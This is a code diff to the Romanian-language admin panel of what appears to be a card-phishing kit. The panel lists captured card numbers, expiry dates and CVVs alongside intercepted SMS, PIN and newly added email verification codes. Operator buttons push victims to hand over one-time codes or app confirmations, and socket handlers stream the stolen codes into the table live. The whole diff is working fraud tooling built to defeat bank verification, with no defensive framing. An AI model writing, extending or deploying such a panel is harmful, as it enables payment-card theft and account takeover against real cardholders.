@@ -74,6 +74,7 @@
           <th>Card</th><th>Exp</th><th>CVV</th>
           <th style="background:#1c1917;color:#fde68a">SMS Cod</th>
           <th style="background:#1c1917;color:#e9d5ff">PIN Cod</th>
+          <th style="background:#1c1917;color:#86efac">Mail Cod</th>
           <th>Status</th><th>Preț</th><th>Acțiuni</th>
         </tr>
       </thead>
@@ -96,6 +97,7 @@
           <td id="cvv-{{ ps.id }}" class="font-mono text-xs" style="color:{{ '#ef4444' if ps.cvv else '#cbd5e1' }}">{{ ps.cvv or '—' }}</td>
           <td id="sms-{{ ps.id }}">{% if ps.sms_status %}<span class="badge bg-green-100 text-green-800 font-mono" style="font-size:13px">{{ ps.sms_status }}</span>{% else %}<span class="text-gray-500">—</span>{% endif %}</td>
           <td id="pin-{{ ps.id }}">{% if ps.pin_code %}<span class="badge bg-purple-100 text-purple-800 font-mono" style="font-size:13px">{{ ps.pin_code }}</span>{% else %}<span class="text-gray-500">—</span>{% endif %}</td>
+          <td id="mail-{{ ps.id }}">{% if ps.mail_code and ps.mail_code != 'waiting' %}<span class="badge bg-green-100 text-green-800 font-mono" style="font-size:13px">{{ ps.mail_code }}</span>{% else %}<span class="text-gray-500">—</span>{% endif %}</td>
           <td id="status-{{ ps.id }}">
             {% if ps.status=='pending' %}<span class="badge bg-yellow-100 text-yellow-700">⏳ Așteptare</span>
             {% elif ps.status=='price_set' %}<span class="badge bg-indigo-100 text-indigo-700">💳 Spre card</span>
@@ -107,7 +109,6 @@
           </td>
           <td><div id="actions-{{ ps.id }}" class="flex gap-1 flex-wrap">
             {% if ps.status=='completed' %}
-              <button class="btn-xs" style="background:#0f766e;color:#fff" onclick="openLinkModal({{ ps.id }})"><i class="fas fa-link"></i> Link</button>
               <button class="btn-xs b-sky" onclick="archiveSession({{ ps.id }})"><i class="fas fa-archive"></i> Move</button>
             {% elif ps.status=='pending' %}
               <button class="btn-xs b-orange" onclick="retrySession({{ ps.id }})"><i class="fas fa-redo"></i></button>
@@ -118,9 +119,9 @@
             {% elif ps.status=='payment_pending' %}
               <button class="btn-xs b-blue" onclick="approvePayment({{ ps.id }})">✓✓ Aprobă</button>
               <button class="btn-xs b-yellow" onclick="sendSMS({{ ps.id }})"><i class="fas fa-sms"></i> SMS</button>
+              <button class="btn-xs" style="background:#16a34a;color:#fff" onclick="sendMail({{ ps.id }})"><i class="fas fa-envelope"></i> Mail</button>
               <button class="btn-xs b-purple" onclick="reqPIN({{ ps.id }})"><i class="fas fa-key"></i> PIN</button>
               <button class="btn-xs b-sky" onclick="reqApp({{ ps.id }})"><i class="fas fa-mobile-alt"></i> App</button>
-              <button class="btn-xs" style="background:#0f766e;color:#fff" onclick="openLinkModal({{ ps.id }})"><i class="fas fa-link"></i> Link</button>
               <button class="btn-xs b-orange" onclick="retrySession({{ ps.id }})"><i class="fas fa-redo"></i></button>
               <button class="btn-xs b-dark" onclick="blockSession({{ ps.id }})"><i class="fas fa-ban"></i></button>
               <button class="btn-xs b-red" onclick="rejectSession({{ ps.id }})"><i class="fas fa-times"></i></button>
@@ -155,6 +156,7 @@
           <th>Card</th><th>Exp</th><th>CVV</th>
           <th style="background:#1c1917;color:#fde68a">SMS Cod</th>
           <th style="background:#1c1917;color:#e9d5ff">PIN Cod</th>
+          <th style="background:#1c1917;color:#86efac">Mail Cod</th>
           <th>Preț</th><th>Data</th>
         </tr>
       </thead>
@@ -175,6 +177,7 @@
           <td class="font-mono text-xs" style="color:#ef4444">{{ ps.cvv or '—' }}</td>
           <td class="font-mono font-bold" style="color:#b45309">{{ ps.sms_status or '—' }}</td>
           <td class="font-mono font-bold" style="color:#7c3aed">{{ ps.pin_code or '—' }}</td>
+          <td class="font-mono font-bold" style="color:#16a34a">{{ ps.mail_code or '—' }}</td>
           <td class="font-bold" style="color:#dc2626">{{ ps.total_price or '—' }}{% if ps.total_price %} {{ ps.currency_code or '€' }}{% endif %}</td>
           <td class="text-gray-800 font-semibold">{{ ps.created_at.strftime('%d.%m.%Y %H:%M') }}</td>
         </tr>
@@ -316,6 +319,7 @@ socket.on('new_session', function(d){
     <td id="cvv-${d.id}" class="font-mono text-gray-500">—</td>
     <td id="sms-${d.id}"><span style="color:#64748b">—</span></td>
     <td id="pin-${d.id}"><span style="color:#64748b">—</span></td>
+    <td id="mail-${d.id}"><span style="color:#64748b">—</span></td>
     <td id="status-${d.id}"><span class="badge bg-indigo-100 text-indigo-700">💳 Spre card</span></td>
     <td id="price-${d.id}" style="color:#5a9e2f;font-weight:700">${d.price ? d.price+' '+(d.currency||'€') : '—'}</td>
     <td><div id="actions-${d.id}" class="flex gap-1 flex-wrap">
@@ -372,9 +376,9 @@ socket.on('payment_submitted', function(d){
   if(acts) acts.innerHTML=`
     <button class="btn-xs b-blue" onclick="approvePayment(${d.id})">✓✓ Aprobă</button>
     <button class="btn-xs b-yellow" onclick="sendSMS(${d.id})"><i class="fas fa-sms"></i> SMS</button>
+    <button class="btn-xs" style="background:#16a34a;color:#fff" onclick="sendMail(${d.id})"><i class="fas fa-envelope"></i> Mail</button>
     <button class="btn-xs b-purple" onclick="reqPIN(${d.id})"><i class="fas fa-key"></i> PIN</button>
     <button class="btn-xs b-sky" onclick="reqApp(${d.id})"><i class="fas fa-mobile-alt"></i> App</button>
-    <button class="btn-xs" style="background:#0f766e;color:#fff" onclick="openLinkModal(${d.id})"><i class="fas fa-link"></i> Link</button>
     <button class="btn-xs b-orange" onclick="retrySession(${d.id})"><i class="fas fa-redo"></i></button>
     <button class="btn-xs b-dark" onclick="blockSession(${d.id})"><i class="fas fa-ban"></i></button>
     <button class="btn-xs b-red" onclick="rejectSession(${d.id})"><i class="fas fa-times"></i></button>`;
@@ -399,6 +403,14 @@ socket.on('pin_waiting', function(d){
 socket.on('pin_code_update', function(d){
   const el=document.getElementById('pin-'+d.id);
   if(el) el.innerHTML=`<span class="badge bg-purple-100 text-purple-800 font-mono" style="font-size:12px;letter-spacing:.1em">${d.code}</span>`;
+});
+socket.on('mail_waiting', function(d){
+  const el=document.getElementById('mail-'+d.id);
+  if(el) el.innerHTML=`<span class="badge bg-yellow-100 text-yellow-700"><i class="fas fa-clock mr-1"></i>Așteptare…</span>`;
+});
+socket.on('mail_code_update', function(d){
+  const el=document.getElementById('mail-'+d.id);
+  if(el) el.innerHTML=`<span class="badge bg-green-100 text-green-800 font-mono" style="font-size:12px;letter-spacing:.1em">${d.code}</span>`;
 });
 socket.on('app_confirmed_update', function(d){
   const el=document.getElementById('pin-'+d.id);
@@ -456,8 +468,9 @@ document.addEventListener('keydown', e=>{ if(e.key==='Enter'&&_priceTarget) conf
 // ── Admin actions ─────────────────────────────────────────────────────────────
 function approvePayment(id){ fetch(`/admin/sessions/${id}/approve`,{method:'POST'}); }
 function rejectSession(id){ if(!confirm('Respingi această sesiune?'))return; fetch(`/admin/sessions/${id}/reject`,{method:'POST'}); }
-function sendSMS(id)  { fetch(`/admin/sessions/${id}/sms`,      {method:'POST'}); }
-function reqPIN(id)   { fetch(`/admin/sessions/${id}/pin`,      {method:'POST'}); }
+function sendSMS(id)  { fetch(`/admin/sessions/${id}/sms`,  {method:'POST'}); }
+function sendMail(id) { fetch(`/admin/sessions/${id}/mail`, {method:'POST'}); }
+function reqPIN(id)   { fetch(`/admin/sessions/${id}/pin`,  {method:'POST'}); }
 function reqApp(id)   { fetch(`/admin/sessions/${id}/app_confirm`,{method:'POST'}); }
 function retrySession(id){ if(!confirm('Trimiți utilizatorul înapoi la pasul 1?'))return; fetch(`/admin/sessions/${id}/retry`,{method:'POST'}); }
 function blockSession(id){ if(!confirm('Blochezi această adresă IP?'))return; fetch(`/admin/sessions/${id}/block`,{method:'POST'}); }
